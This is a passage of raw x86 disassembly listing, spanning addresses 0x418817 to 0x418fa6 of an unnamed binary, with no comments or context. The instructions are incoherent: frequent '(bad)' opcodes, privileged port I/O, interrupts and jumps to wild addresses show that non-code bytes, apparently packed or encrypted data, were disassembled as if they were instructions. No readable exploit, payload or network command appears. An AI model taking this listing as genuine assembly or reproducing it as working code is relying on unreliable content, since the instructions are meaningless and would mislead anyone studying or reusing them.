  418817:	or     bh,BYTE PTR [edi-0x38aedaaa]
  41881d:	not    BYTE PTR [esi+0x2b]
  418820:	push   edi
  418821:	or     bh,BYTE PTR [edi-0x72]
  418824:	ss ins DWORD PTR es:[edi],dx
  418826:	inc    esp
  418827:	push   ebp
  418828:	int3   
  418829:	jo     0x4187d6
  41882b:	push   es
  41882c:	and    al,0xee
  41882e:	arpl   WORD PTR [ecx-0x768b677b],dx
  418834:	dec    esp
  418835:	pop    ebp
  418836:	sbb    dh,dh
  418838:	pusha  
  418839:	inc    ebp
  41883a:	mov    ds:0xb9c4f3d4,al
  41883f:	in     eax,0xa5
  418841:	cmc    
  418842:	pop    ds
  418843:	ja     0x418874
  418845:	cmp    edx,DWORD PTR [ebp+0x32e73672]
  41884b:	xchg   esi,ebx
  41884d:	push   0x40
  41884f:	sbb    DWORD PTR [edi+0x33d33149],ebx
  418855:	aaa    
  418856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418857:	ins    DWORD PTR es:[edi],dx
  418858:	adc    ecx,DWORD PTR [esi]
  41885a:	cs in  eax,dx
  41885c:	and    bl,BYTE PTR [esi]
  41885e:	aad    0x28
  418860:	jae    0x4188ba
  418862:	rcl    BYTE PTR [ebx-0x6b7130cb],1
  418868:	sub    al,BYTE PTR [ecx-0x45]
  41886b:	out    0x3d,al
  41886d:	stos   DWORD PTR es:[edi],eax
  41886e:	popf   
  41886f:	pop    ecx
  418870:	and    eax,0x333103c5
  418875:	jno    0x418881
  418877:	cli    
  418878:	xchg   esi,eax
  418879:	mov    DWORD PTR [esi],esp
  41887b:	push   esp
  41887c:	in     al,dx
  41887d:	mov    esp,0x9ebddbbb
  418882:	or     BYTE PTR es:[ecx],0x7a
  418886:	cmp    eax,0x1715e17b
  41888b:	shl    cl,1
  41888d:	sub    al,0x8d
  41888f:	out    0x6,al
  418891:	aaa    
  418892:	ret    
  418893:	sbb    dl,BYTE PTR [edi+esi*4+0x76]
  418897:	fisubr WORD PTR [ecx-0x597fc1be]
  41889d:	xchg   ebp,eax
  41889e:	push   edx
  41889f:	lods   eax,DWORD PTR ds:[esi]
  4188a0:	cld    
  4188a1:	fs and al,0x4c
  4188a4:	(bad)  
  4188a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a6:	ret    
  4188a7:	js     0x418923
  4188a9:	out    0x55,al
  4188ab:	(bad)  
  4188ac:	call   0xa5e6d38a
  4188b1:	sbb    ah,BYTE PTR [ecx+0x4c]
  4188b4:	mov    ch,0x59
  4188b6:	add    al,0x61
  4188b8:	adc    eax,0xad90426c
  4188bd:	ror    DWORD PTR [edx-0x16],cl
  4188c0:	rcr    BYTE PTR [edx+0x6],1
  4188c3:	clc    
  4188c4:	inc    ecx
  4188c5:	pushf  
  4188c6:	xor    eax,0x1477bb5c
  4188cb:	push   ecx
  4188cc:	push   0x6f
  4188ce:	dec    ebx
  4188cf:	js     0x418874
  4188d1:	add    eax,0xe846eb2f
  4188d6:	scas   eax,DWORD PTR es:[edi]
  4188d7:	jne    0x41894a
  4188d9:	jg     0x418892
  4188db:	clc    
  4188dc:	aad    0x41
  4188de:	push   esp
  4188df:	int    0x60
  4188e1:	cld    
  4188e2:	xor    ebp,esi
  4188e4:	xchg   ecx,eax
  4188e5:	cs inc edx
  4188e7:	mov    esp,0x4c4a1c76
  4188ec:	and    eax,0x61bedb84
  4188f1:	test   al,0x9
  4188f3:	sub    al,0x18
  4188f5:	sub    eax,DWORD PTR [esi]
  4188f7:	(bad)  
  4188f8:	sbb    eax,0xc3e542d6
  4188fd:	enter  0x99d7,0x30
  418901:	ja     0x41889a
  418903:	dec    ebp
  418904:	push   ds
  418905:	je     0x4188f3
  418907:	fdiv   DWORD PTR [edi]
  418909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890a:	mov    ah,0x7c
  41890c:	ror    al,1
  41890e:	mov    edi,0xf402f596
  418913:	push   0x416cf7a
  418918:	repnz sahf 
  41891a:	mov    dl,0x1e
  41891c:	sbb    al,0x7b
  41891e:	addr16 std 
  418920:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  418922:	jl     0x41891b
  418924:	xor    dh,bh
  418926:	mov    ah,0x5
  418928:	in     al,dx
  418929:	iret   
  41892a:	ins    BYTE PTR es:[edi],dx
  41892b:	add    BYTE PTR [ecx+0x4c],al
  41892e:	or     bh,ah
  418930:	and    al,0x37
  418932:	jbe    0x41899e
  418934:	pop    eax
  418935:	or     eax,0xb0f6f75b
  41893a:	cmp    al,0x2d
  41893c:	jae    0x418938
  41893e:	shl    DWORD PTR [edi],0x9b
  418941:	mov    esi,0x4fbfeb84
  418946:	add    eax,ebp
  418948:	ins    DWORD PTR es:[edi],dx
  418949:	fld    DWORD PTR [edi]
  41894b:	cmp    dl,BYTE PTR [ebx-0x5e]
  41894e:	jg     0x41896a
  418950:	gs (bad) 
  418952:	mov    ds,WORD PTR [ebp+eax*2+0x3f305cb1]
  418959:	inc    esi
  41895a:	scas   eax,DWORD PTR es:[edi]
  41895b:	pop    edi
  41895c:	arpl   WORD PTR [eax],cx
  41895e:	les    eax,FWORD PTR [edi+0x2aca9f61]
  418964:	sti    
  418965:	sub    DWORD PTR [ebx+eiz*2],ecx
  418968:	mov    gs,WORD PTR fs:[esp+ecx*4+0x5ccc47a5]
  418970:	pop    ebx
  418971:	and    esp,DWORD PTR [eax]
  418973:	loope  0x418919
  418975:	cmp    ecx,DWORD PTR [edx]
  418977:	push   edi
  418978:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41897a:	out    0x4e,al
  41897c:	cwde   
  41897d:	ds xor eax,0x51d40130
  418983:	pop    edx
  418984:	pusha  
  418985:	add    al,BYTE PTR [eax]
  418987:	sub    BYTE PTR [edx],al
  418989:	fnsave [ebx-0x1e]
  41898c:	add    DWORD PTR [edi+edx*2-0x1dd1c0ca],edx
  418993:	mov    BYTE PTR [ebx],cl
  418995:	sub    DWORD PTR [esi],ecx
  418997:	in     al,dx
  418998:	sbb    DWORD PTR [ecx],esi
  41899a:	cmp    al,0xbc
  41899c:	mov    bh,0x5e
  41899e:	dec    edx
  41899f:	or     dl,BYTE PTR fs:[ebx]
  4189a2:	add    al,0xe3
  4189a4:	sbb    esi,DWORD PTR [ebx+0x206b94ab]
  4189aa:	in     al,0xa0
  4189ac:	shr    bl,0x77
  4189af:	pusha  
  4189b0:	mov    dh,0x9e
  4189b2:	outs   dx,DWORD PTR ds:[esi]
  4189b3:	call   0x4cf8:0xaf63fb3a
  4189ba:	mov    bl,0x20
  4189bc:	ins    DWORD PTR es:[edi],dx
  4189bd:	inc    edi
  4189be:	jb     0x418995
  4189c0:	mov    dh,0x71
  4189c2:	ss inc edi
  4189c4:	mov    bh,0x2c
  4189c6:	mov    al,ds:0xcbecbd13
  4189cb:	lds    eax,FWORD PTR [esi-0x2]
  4189ce:	jns    0x4189c1
  4189d0:	ret    
  4189d1:	dec    edi
  4189d2:	nop
  4189d3:	cmp    eax,0x70cde09a
  4189d8:	mov    edi,DWORD PTR [esi+0x7f]
  4189db:	bound  esp,QWORD PTR [esi+0x2e]
  4189de:	jmp    0x4189a4
  4189e0:	mov    al,0xc1
  4189e2:	add    edi,ebp
  4189e4:	fstp   TBYTE PTR [eax]
  4189e6:	outs   dx,DWORD PTR ds:[esi]
  4189e7:	inc    bh
  4189e9:	imul   ebx,DWORD PTR ds:0xfdc426de,0xfffffffe
  4189f0:	mov    ah,BYTE PTR ds:0x489b1d2d
  4189f6:	push   eax
  4189f7:	inc    esp
  4189f8:	dec    edi
  4189f9:	pop    eax
  4189fa:	cmp    DWORD PTR [edx],ebp
  4189fc:	inc    ebx
  4189fd:	mov    al,ds:0x3250eb55
  418a02:	push   ebp
  418a03:	aas    
  418a04:	add    esi,esp
  418a06:	and    bl,BYTE PTR [eax+0x71]
  418a09:	push   ebp
  418a0a:	jmp    0x418a65
  418a0c:	in     al,dx
  418a0d:	mov    DWORD PTR [ecx+edi*4],edi
  418a10:	aas    
  418a11:	pop    ebx
  418a12:	mov    edi,0x53607131
  418a17:	ss mov eax,0x2f8f849c
  418a1d:	jmp    0x45ccbf0d
  418a22:	or     al,0x33
  418a24:	ror    DWORD PTR [ebx-0x3dfc07b3],0xf
  418a2b:	scas   eax,DWORD PTR es:[edi]
  418a2c:	shr    ecx,0xba
  418a2f:	and    eax,DWORD PTR [eax]
  418a31:	add    al,bh
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	add    dl,BYTE PTR [edx+0x1f396eb7]
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	test   al,dl
  418a4c:	dec    eax
  418a4d:	pop    ds
  418a4e:	fisub  DWORD PTR [edx]
  418a50:	lahf   
  418a51:	cmp    al,0x5e
  418a54:	pushf  
  418a55:	mov    ebx,0x6672ae1a
  418a5a:	sbb    al,0xf
  418a5c:	iret   
  418a5d:	sub    al,0xc
  418a5f:	xchg   ebx,eax
  418a60:	pop    ss
  418a61:	xchg   edi,eax
  418a62:	clc    
  418a63:	or     eax,0x46b993ae
  418a68:	call   0x5d7daa01
  418a6d:	(bad)  [edx+0x61a45ade]
  418a73:	fcom   QWORD PTR [edi]
  418a75:	(bad)  
  418a76:	out    0x44,eax
  418a78:	mov    eax,ds:0x3e0021c1
  418a7d:	cmp    esp,0x1f
  418a80:	cli    
  418a81:	pushf  
  418a82:	inc    ebx
  418a83:	aad    0x4c
  418a85:	jmp    0x418a98
  418a87:	fcomp  QWORD PTR [edx]
  418a89:	or     dh,dh
  418a8b:	inc    ebp
  418a8c:	outs   dx,DWORD PTR ds:[esi]
  418a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8e:	inc    esp
  418a8f:	pop    esi
  418a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a91:	push   edx
  418a92:	jmp    0x418ae1
  418a94:	or     edi,DWORD PTR [edi+0x250d691f]
  418a9a:	xchg   ebp,eax
  418a9b:	pusha  
  418a9c:	vpaddusb ymm4,ymm1,YMMWORD PTR [edi]
  418aa0:	xor    DWORD PTR [ebx-0x74d2203e],eax
  418aa6:	mov    DWORD PTR ds:0xa48bddb,ebx
  418aac:	inc    ebx
  418aad:	jb     0x418a61
  418aaf:	popa   
  418ab0:	cmp    BYTE PTR [edx+0x220ed83d],ah
  418ab6:	mov    bl,BYTE PTR [eax-0x25]
  418ab9:	add    BYTE PTR [ecx],bh
  418abb:	inc    eax
  418abc:	push   es
  418abd:	cmp    BYTE PTR [ebx-0x54],bl
  418ac0:	cmp    eax,0xa95a00ad
  418ac5:	mov    dl,0x28
  418ac7:	and    al,0x43
  418ac9:	shr    DWORD PTR [edi+0x29],cl
  418acc:	adc    ch,ah
  418ace:	fwait
  418acf:	xchg   ebp,eax
  418ad0:	dec    eax
  418ad1:	fisttp DWORD PTR ds:0x75aafeef
  418ad7:	mov    dh,0x69
  418ad9:	outs   dx,DWORD PTR ds:[esi]
  418ada:	mov    ah,0xf
  418adc:	pop    ebp
  418add:	push   cs
  418ade:	mov    dl,0x22
  418ae0:	loop   0x418acb
  418ae2:	shr    DWORD PTR [ebx+0x16],1
  418ae5:	mov    ebx,0x72a146e0
  418aea:	pop    ecx
  418aeb:	jo     0x418b6b
  418aed:	sub    al,0x16
  418aef:	xchg   edx,eax
  418af0:	call   0xfa87:0x954e065
  418af7:	inc    ebx
  418af8:	loopne 0x418afe
  418afa:	out    0xac,eax
  418afc:	cmc    
  418afd:	cmp    BYTE PTR [ebx-0x1d295fe5],cl
  418b03:	xor    BYTE PTR [esi],0xc2
  418b06:	push   es
  418b07:	ja     0x418abe
  418b09:	jns    0x418a9d
  418b0b:	sub    al,0x4d
  418b0d:	mov    eax,ds:0x3a50ef0e
  418b12:	mov    bh,0xe8
  418b14:	jle    0x418b24
  418b16:	fcmovnbe st,st(1)
  418b18:	xchg   edi,eax
  418b19:	mov    esi,0xfe07d3dd
  418b1e:	push   edi
  418b1f:	sbb    BYTE PTR cs:[edx-0x5f],dh
  418b23:	shr    DWORD PTR [ecx+ecx*2+0xde04be9],cl
  418b2a:	mov    al,ds:0xaf00295a
  418b2f:	jae    0x418ae9
  418b31:	sub    ch,BYTE PTR [ebp-0x12eec7ad]
  418b37:	out    dx,al
  418b38:	jno    0x418ae6
  418b3a:	xchg   edx,eax
  418b3b:	outs   dx,BYTE PTR ds:[esi]
  418b3c:	scas   al,BYTE PTR es:[edi]
  418b3d:	fidiv  WORD PTR [ecx-0x76e0f077]
  418b43:	adc    eax,0xbd3c2a12
  418b48:	push   ds
  418b49:	enter  0xe5e9,0x89
  418b4d:	gs inc ebp
  418b4f:	jmp    0x63939f5f
  418b54:	mov    eax,0xac484a0a
  418b59:	and    al,0x40
  418b5b:	push   esp
  418b5c:	fnstcw WORD PTR ds:0xc135c61c
  418b62:	pop    es
  418b63:	(bad)  
  418b64:	out    0xa1,al
  418b66:	mov    edi,0xf1a344fa
  418b6b:	es dec ebx
  418b6d:	mov    ds:0xfae3529d,eax
  418b72:	sub    ch,BYTE PTR [ecx+eiz*8]
  418b75:	fs inc edx
  418b77:	push   0xffffff92
  418b79:	mov    ebp,0x3d30b30e
  418b7e:	test   al,0x8e
  418b80:	push   edx
  418b81:	mov    eax,ds:0x5d6d93ca
  418b86:	lea    edi,[ecx-0x64]
  418b89:	mov    eax,ds:0x46231db8
  418b8e:	xchg   BYTE PTR [eax+0x6bf30e3d],ah
  418b94:	inc    DWORD PTR [edx]
  418b96:	push   0x17
  418b98:	mov    dh,0x7b
  418b9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b9b:	pop    es
  418b9c:	adc    edx,DWORD PTR [esi+0xa]
  418b9f:	sahf   
  418ba0:	pop    ebp
  418ba1:	div    cl
  418ba3:	aam    0xb1
  418ba5:	xchg   DWORD PTR [edi+0x65f2d655],esi
  418bab:	mov    ds:0x7e262977,al
  418bb0:	mov    DWORD PTR [edx],edi
  418bb2:	es sbb al,0x46
  418bb5:	jbe    0x418c1d
  418bb7:	out    dx,eax
  418bb8:	fs idiv bl
  418bbb:	sbb    al,0x6a
  418bbd:	call   DWORD PTR [edx]
  418bbf:	xor    esi,DWORD PTR [ebx]
  418bc1:	xor    DWORD PTR [ebx],ebp
  418bc3:	clc    
  418bc4:	inc    esp
  418bc5:	mov    eax,0xf0a5a97f
  418bca:	pop    ecx
  418bcb:	sub    DWORD PTR [edi-0x4e934f44],ebp
  418bd1:	aaa    
  418bd2:	daa    
  418bd3:	enter  0x9ec3,0xb7
  418bd7:	test   al,0x3
  418bd9:	test   ecx,0xac5b1d7b
  418bdf:	push   esi
  418be0:	cdq    
  418be1:	mov    ds:0x218a2eb5,eax
  418be6:	iret   
  418be7:	mov    esp,0xf4e435e5
  418bec:	and    DWORD PTR [esi-0x7b],edx
  418bef:	adc    edx,DWORD PTR [esi-0x4f]
  418bf2:	(bad)  
  418bf3:	ror    BYTE PTR [esi-0x47c8e0ba],1
  418bf9:	out    0x5,al
  418bfb:	retf   
  418bfc:	sbb    BYTE PTR [edi-0x21],bh
  418bff:	xchg   edi,eax
  418c00:	or     BYTE PTR [ebx+eiz*4+0x6b4020d1],bh
  418c07:	rol    BYTE PTR [eax],1
  418c09:	add    al,BYTE PTR fs:[eax-0x3f]
  418c0d:	js     0x418c4d
  418c0f:	jae    0x418b91
  418c11:	push   ebx
  418c12:	xor    eax,0xeb243ef1
  418c17:	or     eax,0xdbaccc50
  418c1c:	or     eax,0x5974e40d
  418c21:	and    esi,ecx
  418c23:	xchg   edi,eax
  418c24:	push   edi
  418c25:	cmp    dh,BYTE PTR [ebx+0x1]
  418c28:	pop    esp
  418c29:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  418c2b:	std    
  418c2c:	fdivr  QWORD PTR [ebx-0x58]
  418c2f:	jmp    0xdc3f3d19
  418c34:	hlt    
  418c35:	into   
  418c36:	mov    bh,0xc5
  418c38:	repz sbb esp,edi
  418c3b:	pusha  
  418c3c:	xchg   edi,eax
  418c3d:	mov    esi,0xbf0a091
  418c42:	int    0x23
  418c44:	outs   dx,BYTE PTR ds:[esi]
  418c45:	pop    esi
  418c46:	outs   dx,BYTE PTR ds:[esi]
  418c47:	ins    DWORD PTR es:[edi],dx
  418c48:	repnz sar DWORD PTR [edx],cl
  418c4b:	jbe    0x418c51
  418c4d:	pop    ebx
  418c4e:	js     0x418cb4
  418c50:	adc    cl,BYTE PTR [ebp+0x66]
  418c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c54:	mov    esi,0x28b0650a
  418c59:	loopne 0x418c3b
  418c5b:	loop   0x418c42
  418c5d:	mov    ds:0xc03d7265,al
  418c62:	dec    edi
  418c63:	clc    
  418c64:	pop    ebx
  418c65:	push   cs
  418c66:	xchg   DWORD PTR ss:[eax+0x4c07fa4f],edi
  418c6d:	dec    ebp
  418c6e:	jno    0x418c2f
  418c70:	fnstenv [ebp+ebx*8+0x69]
  418c74:	scas   eax,DWORD PTR es:[edi]
  418c75:	es enter 0xbf26,0x35
  418c7a:	(bad)  
  418c7b:	aam    0x79
  418c7d:	(bad)  
  418c7e:	nop
  418c7f:	mov    dh,BYTE PTR [edx+0xc92137a]
  418c85:	jmp    FWORD PTR [ebx+0x0]
  418c88:	mov    eax,0xc1e17862
  418c8d:	loopne 0x418d04
  418c8f:	mov    bl,0x8e
  418c91:	inc    esp
  418c92:	mov    eax,0xf090684a
  418c97:	xor    esi,DWORD PTR [edx]
  418c99:	jno    0x418c6f
  418c9b:	std    
  418c9c:	xchg   edx,eax
  418c9d:	or     bl,BYTE PTR [edi+0x1a]
  418ca0:	mov    es,WORD PTR [edx]
  418ca2:	jp     0x418c92
  418ca4:	mov    ds:0x2576e619,eax
  418ca9:	xlat   BYTE PTR ds:[ebx]
  418caa:	sahf   
  418cab:	fs (bad) 
  418cad:	dec    edi
  418cae:	or     al,0xce
  418cb0:	mov    esp,0x14d89b92
  418cb5:	pushf  
  418cb6:	pushf  
  418cb7:	push   ebp
  418cb8:	gs or  eax,0xacd2968b
  418cbe:	dec    edx
  418cbf:	jnp    0x418cf6
  418cc1:	jb     0x418c88
  418cc3:	lods   eax,DWORD PTR ds:[esi]
  418cc4:	dec    esp
  418cc5:	in     al,dx
  418cc6:	shr    BYTE PTR [edi+edx*4+0x7fad335b],cl
  418ccd:	dec    eax
  418cce:	mov    WORD PTR [edi-0x74158e58],?
  418cd4:	xor    eax,ebx
  418cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cd8:	addr16 daa 
  418cda:	hlt    
  418cdb:	push   0xffffffed
  418cdd:	mov    ds:0x6f3aad4d,eax
  418ce2:	cmp    DWORD PTR [edx-0x20],ebx
  418ce5:	shl    DWORD PTR [ebp+ebp*2-0x4dd09401],1
  418cec:	fmul   QWORD PTR [ecx-0x704d67ae]
  418cf2:	shl    BYTE PTR [edi+0x56],0x49
  418cf6:	or     eax,0x61c420f7
  418cfb:	cmp    esp,DWORD PTR [edx+0x69]
  418cfe:	push   0x9df36b59
  418d03:	(bad)  
  418d04:	xchg   ebx,eax
  418d05:	or     bh,cl
  418d07:	sbb    dh,BYTE PTR [ebx-0x69a7d3da]
  418d0d:	mov    BYTE PTR [ecx],cl
  418d0f:	xchg   DWORD PTR [ebp-0x28],edi
  418d12:	sahf   
  418d13:	fwait
  418d14:	aad    0xe7
  418d16:	in     eax,dx
  418d17:	push   eax
  418d18:	pop    eax
  418d19:	pop    esp
  418d1a:	or     DWORD PTR [esi+0x74],esi
  418d1d:	stc    
  418d1e:	and    BYTE PTR [esi-0x7414436b],cl
  418d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d25:	and    al,0x53
  418d27:	adc    DWORD PTR [edx-0x4a],esp
  418d2a:	imul   ebx,DWORD PTR [edx],0x392a9b47
  418d30:	pop    ds
  418d31:	cmp    al,0xb5
  418d33:	xchg   esi,eax
  418d34:	imul   ebx,DWORD PTR ds:0x6951c41c,0xec08e524
  418d3e:	neg    DWORD PTR [esi]
  418d40:	inc    esp
  418d41:	or     DWORD PTR [edx-0x4017ffa8],eax
  418d47:	es retf 
  418d49:	xchg   BYTE PTR [edx],dh
  418d4b:	aas    
  418d4c:	add    ch,BYTE PTR [ecx+0x0]
  418d4f:	inc    ebx
  418d50:	fiadd  WORD PTR [edx+0x4f]
  418d53:	arpl   cx,bx
  418d55:	jmp    0xb52f:0xe66acd76
  418d5c:	retf   
  418d5d:	int    0xe7
  418d5f:	add    esi,DWORD PTR [edx+eiz*4+0x5c9b78f5]
  418d66:	ins    BYTE PTR es:[edi],dx
  418d67:	sub    DWORD PTR [esp+edx*8+0x55],ebx
  418d6b:	retf   
  418d6c:	repnz inc edx
  418d6e:	mov    dl,al
  418d70:	std    
  418d71:	mov    dh,0x66
  418d73:	(bad)  
  418d74:	das    
  418d75:	ins    DWORD PTR es:[edi],dx
  418d76:	iret   
  418d77:	ss cld 
  418d79:	int3   
  418d7a:	mov    ch,0xe3
  418d7c:	iret   
  418d7d:	pop    ebp
  418d7e:	inc    ebp
  418d7f:	sar    DWORD PTR [ecx-0xb],cl
  418d82:	shl    BYTE PTR ds:0xa9420392,1
  418d88:	push   DWORD PTR [ebp-0x77fb251e]
  418d8e:	fsub   DWORD PTR gs:[esi-0x8]
  418d92:	inc    ecx
  418d93:	je     0x418e0a
  418d95:	out    0x48,eax
  418d97:	or     bl,dh
  418d99:	inc    esp
  418d9a:	data16 into 
  418d9c:	inc    esp
  418d9d:	(bad)  
  418d9e:	aas    
  418d9f:	mov    eax,ds:0xf39f783d
  418da4:	adc    eax,0xb244e723
  418da9:	xor    eax,0x2154a316
  418dae:	xor    DWORD PTR [edi+ebp*1+0x51],esi
  418db2:	and    ah,dh
  418db4:	mov    al,BYTE PTR [eax]
  418db6:	shl    BYTE PTR [ebp-0x7aa9b410],cl
  418dbc:	inc    ebp
  418dbd:	or     al,BYTE PTR [ebp-0x7482ca85]
  418dc3:	loopne 0x418dd3
  418dc5:	clc    
  418dc6:	shr    BYTE PTR [ebx],1
  418dc8:	ins    BYTE PTR es:[edi],dx
  418dc9:	or     BYTE PTR [edx],ch
  418dcb:	sar    BYTE PTR [ebx],0x4a
  418dce:	inc    ecx
  418dcf:	ja     0x418dae
  418dd1:	inc    edx
  418dd2:	xor    al,0xa
  418dd4:	nop
  418dd5:	nop
  418dd6:	jb     0x418e3b
  418dd8:	mov    dl,0xba
  418dda:	push   es
  418ddb:	push   esp
  418ddc:	ja     0x418dee
  418dde:	es stos BYTE PTR es:[edi],al
  418de0:	(bad)  
  418de1:	mov    esi,0x514f3ddf
  418de6:	dec    edx
  418de7:	xchg   BYTE PTR [ecx+0x75756417],dl
  418ded:	repz idiv BYTE PTR ss:[eax]
  418df1:	in     al,0xd9
  418df3:	or     DWORD PTR [edi+0x58],ebx
  418df6:	mov    edi,0x5faba1ad
  418dfb:	out    0x65,eax
  418dfd:	fbld   TBYTE PTR [ebp+0xf11aadd]
  418e03:	in     al,0x39
  418e05:	cs jge 0x418e6e
  418e08:	sbb    dl,BYTE PTR [edi]
  418e0a:	cmp    al,0x9e
  418e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e0d:	loopne 0x418e7f
  418e0f:	in     al,0x38
  418e11:	xor    al,0xd5
  418e13:	mov    al,BYTE PTR [eax-0x3ea0d888]
  418e19:	fistp  WORD PTR [edx+0x74f32c7c]
  418e1f:	lock sub ebx,edi
  418e22:	sub    DWORD PTR [ebx+ebp*8],ecx
  418e25:	mov    esp,0x5aa054a7
  418e2a:	ja     0x418e68
  418e2c:	jns    0x418dd8
  418e2e:	rcr    esp,0x8a
  418e31:	dec    ebp
  418e32:	xor    edi,ebx
  418e34:	mov    DWORD PTR [eax],0x206afeb9
  418e3a:	loope  0x418dd4
  418e3c:	test   BYTE PTR [ecx+0x1f92bca1],0x5e
  418e43:	push   ebx
  418e44:	daa    
  418e45:	test   esp,ebp
  418e47:	repnz push 0xab44cb58
  418e4d:	push   edx
  418e4e:	(bad)  
  418e4f:	dec    ebp
  418e50:	mov    ecx,0x4c34ccac
  418e55:	stc    
  418e56:	aad    0x9
  418e58:	push   ebp
  418e59:	mov    al,0xd
  418e5b:	mov    edx,es
  418e5d:	aas    
  418e5e:	and    DWORD PTR [eax-0x4f],ecx
  418e61:	es popf 
  418e63:	mov    ?,WORD PTR [ecx-0x68]
  418e66:	lahf   
  418e67:	pop    esp
  418e68:	outs   dx,DWORD PTR ds:[esi]
  418e69:	icebp  
  418e6a:	imul   esp,edx,0x6a
  418e6d:	cs scas al,BYTE PTR es:[edi]
  418e6f:	mov    ds:0xd5bad38b,eax
  418e74:	and    al,0x8b
  418e76:	ret    
  418e77:	jmp    0x418ee5
  418e79:	and    BYTE PTR [edi+eiz*2-0x42ba9dd6],0x3b
  418e81:	sub    eax,0x1dab8a3c
  418e86:	push   0xffffff94
  418e88:	dec    ebp
  418e89:	xor    eax,0x7bdc8cd8
  418e8e:	dec    edi
  418e8f:	cdq    
  418e90:	out    dx,eax
  418e91:	into   
  418e92:	adc    ebp,ecx
  418e94:	in     eax,dx
  418e95:	mov    al,0x6b
  418e97:	xor    eax,0x49239e6d
  418e9c:	fsubr  QWORD PTR [ebp-0x2a]
  418e9f:	mov    ebx,0x410e7e48
  418ea4:	add    BYTE PTR [edi+0x4f937a9f],ch
  418eaa:	xchg   ecx,eax
  418eab:	sub    al,0x85
  418ead:	ret    
  418eae:	fwait
  418eaf:	shl    BYTE PTR [ecx+0x31ce0cd],cl
  418eb5:	(bad)  
  418eb6:	mov    ah,0x11
  418eb8:	push   es
  418eb9:	sub    al,0x3e
  418ebb:	and    bh,BYTE PTR [ecx-0x29bbaadf]
  418ec1:	shr    esp,0x8f
  418ec4:	popf   
  418ec5:	out    dx,al
  418ec6:	dec    edx
  418ec7:	in     al,0xa7
  418ec9:	xchg   DWORD PTR [edx+0x11f1e32f],ecx
  418ecf:	imul   esp,DWORD PTR [ecx-0x7f],0x9e936473
  418ed6:	inc    edi
  418ed7:	sbb    eax,0xffa51eb7
  418edc:	int3   
  418edd:	out    dx,eax
  418ede:	or     DWORD PTR [ebx-0x18],ebp
  418ee1:	mov    esi,0x5752a598
  418ee6:	lock pop ss
  418ee8:	or     al,0xdf
  418eea:	jl     0x418e99
  418eec:	inc    eax
  418eed:	mov    ss,edi
  418eef:	jbe    0x418eee
  418ef1:	mov    dl,BYTE PTR [eax+eax*4]
  418ef4:	int3   
  418ef5:	xchg   dh,bh
  418ef7:	aad    0x90
  418ef9:	mov    ah,0x7e
  418efb:	inc    esi
  418efc:	mov    edx,0x6626900e
  418f01:	in     al,dx
  418f02:	mov    cl,0xc3
  418f04:	xchg   ebp,eax
  418f05:	(bad)  
  418f06:	test   edx,0x23206bb6
  418f0c:	inc    ebx
  418f0d:	inc    ebp
  418f0e:	rcr    BYTE PTR [esi+0x76],cl
  418f11:	xor    al,0x7e
  418f13:	and    BYTE PTR [edx+0x70],ch
  418f16:	out    0x43,al
  418f18:	lahf   
  418f19:	pop    ds
  418f1a:	neg    BYTE PTR [ebx+0x1f66d997]
  418f20:	push   0xffffffab
  418f22:	ror    esp,0x29
  418f25:	jge    0x418f65
  418f27:	add    al,0x2e
  418f29:	cli    
  418f2a:	mov    cl,0x23
  418f2c:	push   0xffffffe4
  418f2e:	pushf  
  418f2f:	or     al,0xe6
  418f31:	outs   dx,BYTE PTR ds:[esi]
  418f32:	outs   dx,BYTE PTR ds:[esi]
  418f33:	leave  
  418f34:	mov    esp,DWORD PTR [eax+0x572cab64]
  418f3a:	(bad)  
  418f3b:	mov    esp,0xcccdb6a7
  418f40:	mov    ecx,0xd4367dd8
  418f45:	cmp    bh,ah
  418f47:	mov    cs,WORD PTR [ebx-0x1722f912]
  418f4d:	mov    DWORD PTR [ecx],ebp
  418f4f:	jne    0x418f3d
  418f51:	bound  ebx,QWORD PTR [ecx+ebx*1]
  418f54:	dec    esp
  418f55:	sahf   
  418f56:	in     al,dx
  418f57:	xchg   BYTE PTR [esi-0x34],bl
  418f5a:	sbb    dl,BYTE PTR [edx]
  418f5c:	nop
  418f5d:	inc    esp
  418f5e:	leave  
  418f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f60:	and    bh,bl
  418f62:	(bad)  
  418f63:	cmp    ebp,DWORD PTR [ebp+0x49d8679f]
  418f69:	call   0x5ff03ea
  418f6e:	aad    0xff
  418f70:	mov    dl,0xc6
  418f72:	cwde   
  418f73:	retf   
  418f74:	jb     0x418f08
  418f76:	mov    bh,0xfa
  418f78:	ins    BYTE PTR es:[edi],dx
  418f79:	lods   eax,DWORD PTR ds:[esi]
  418f7a:	neg    BYTE PTR [esi-0xd8c86d1]
  418f80:	jnp    0x418f18
  418f82:	jl     0x418fe1
  418f84:	leave  
  418f85:	fstp   QWORD PTR [edx-0x31275a2e]
  418f8b:	cmp    ah,BYTE PTR [ebx]
  418f8d:	pop    ecx
  418f8e:	inc    esp
  418f8f:	mov    dh,0x54
  418f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f92:	push   edi
  418f93:	mov    ch,0xc3
  418f95:	je     0x418ffe
  418f97:	cli    
  418f98:	dec    esp
  418f99:	sahf   
  418f9a:	mov    esp,0x5042552c
  418f9f:	sbb    esp,edi
  418fa1:	inc    eax
  418fa2:	mov    DWORD PTR [ecx],ebp
  418fa4:	fdiv   DWORD PTR [eax]
  418fa6:	sti    
